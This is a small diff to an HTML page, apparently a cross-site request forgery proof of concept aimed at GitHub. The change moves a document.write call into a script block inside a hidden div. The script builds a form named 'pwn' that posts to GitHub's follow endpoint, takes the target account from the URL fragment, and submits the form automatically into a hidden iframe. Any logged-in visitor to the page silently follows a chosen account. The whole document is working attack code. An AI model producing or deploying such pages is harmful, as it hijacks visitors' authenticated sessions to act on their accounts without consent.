@@ -1,9 +1,12 @@
 <html><body>
 <div style="display:none">
 <iframe name=ifr></iframe>
-document.write('<form target=ifr name=pwn method=post action="https://github.com/users/follow?target='+document.location.hash.substr(1)+'"></form>')
+
 <script>
+document.write('<form target=ifr name=pwn method=post action="https://github.com/users/follow?target='+document.location.hash.substr(1)+'"></form>')
 pwn.submit()
 </script>
+
+
 </div>
 </body></html>
